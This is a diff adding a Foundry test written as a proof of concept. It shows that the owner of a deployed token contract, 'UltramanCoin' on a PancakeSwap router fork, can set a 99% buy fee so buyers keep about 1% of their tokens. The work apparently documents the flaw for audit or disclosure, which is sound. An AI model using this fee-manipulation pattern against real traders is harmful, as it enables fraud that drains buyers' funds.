@@ -1,0 +1,96 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+// Minimal interfaces for interaction
+interface IUniswapV2Router02 {
+    function swapExactETHForTokens(
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external payable returns (uint[] memory amounts);
+    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
+    function WETH() external pure returns (address);
+}
+
+interface IUltramanCoin {
+    function owner() external view returns (address);
+    function setBuyFees(uint8 _rfi, uint8 _treasury, uint8 _dev, uint8 _lp) external;
+    function balanceOf(address account) external view returns (uint256);
+    function treasuryAddress() external view returns (address payable);
+    function devAddress() external view returns (address payable);
+    function isAutomatedMarketMakerPair(address) external view returns (bool);
+    function uniswapPair() external view returns (address);
+    function maxTxAmountBuy() external view returns (uint256);
+    function setMaxTransactionAmount(uint256 _maxTxAmountBuyPct, uint256 _maxTxAmountSellPct) external;
+}
+
+contract ExploitTest is Test {
+    address constant TOKEN = 0x733f8B3545a810214D2D27EEC8c60f93b561C050;
+    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+    IUltramanCoin constant token = IUltramanCoin(TOKEN);
+    IUniswapV2Router02 constant router = IUniswapV2Router02(ROUTER);
+
+    address user;
+    address owner;
+
+    function setUp() public {
+        user = address(0x1234);
+        owner = token.owner();
+
+        // Label addresses for trace
+        vm.label(TOKEN, "UltramanCoin");
+        vm.label(ROUTER, "PancakeRouter");
+        vm.label(owner, "Owner");
+        vm.label(user, "User");
+    }
+
+    function testUnlimitedTransactionFees() public {
+        // ---- Step 1: Owner sets exorbitant buy fees ----
+        // Set buy fees: 0% reflection, 99% treasury (toSwap = 99% of amount)
+        // This means user will only receive 1% of the swapped tokens
+        vm.startPrank(owner);
+        token.setBuyFees(0, 99, 0, 0); // rfi=0, treasury=99, dev=0, lp=0 -> toSwap=99
+        // Also increase maxTxAmountBuy to allow a meaningful swap (default is 1% of supply ~0.01 tokens)
+        // Set it to allow up to 10% of supply (100 million base units)
+        token.setMaxTransactionAmount(10, 10); // _maxTxAmountBuyPct = 10 -> maxTxAmountBuy = 10% of supply
+        vm.stopPrank();
+
+        // ---- Step 2: User swaps BNB for tokens ----
+        // User gets 1 BNB from the test
+        deal(user, 1 ether);
+
+        address[] memory path = new address[](2);
+        path[0] = router.WETH();
+        path[1] = TOKEN;
+
+        uint256 amountIn = 0.01 ether; // small to avoid slippage issues
+        uint256 expectedTokens = router.getAmountsOut(amountIn, path)[1];
+
+        vm.prank(user);
+        uint[] memory amounts = router.swapExactETHForTokens{value: amountIn}(
+            0, // accept any minimum
+            path,
+            user,
+            block.timestamp
+        );
+
+        uint256 received = amounts[1];
+        uint256 userBalance = token.balanceOf(user);
+
+        // Due to 99% toSwap fee, user should receive only about 1% of expected tokens
+        // Allow some rounding error (reflection mechanics may cause tiny differences)
+        assertLt(received, expectedTokens / 10, "Fee not applied: user received too many tokens");
+        assertApproxEqAbs(received, expectedTokens / 100, expectedTokens / 200, "User should have about 1% of expected tokens");
+
+        // Also verify that the treasury (contract owner) received value indirectly via the swap-and-liquify mechanism
+        // but the main point is that the user lost 99% of their tokens to fees.
+        // Assert that the contract balance increased (fees were taken)
+        uint256 contractTokenBalance = token.balanceOf(TOKEN);
+        assertGt(contractTokenBalance, 0, "Contract should have collected fee tokens");
+    }
+}
+```
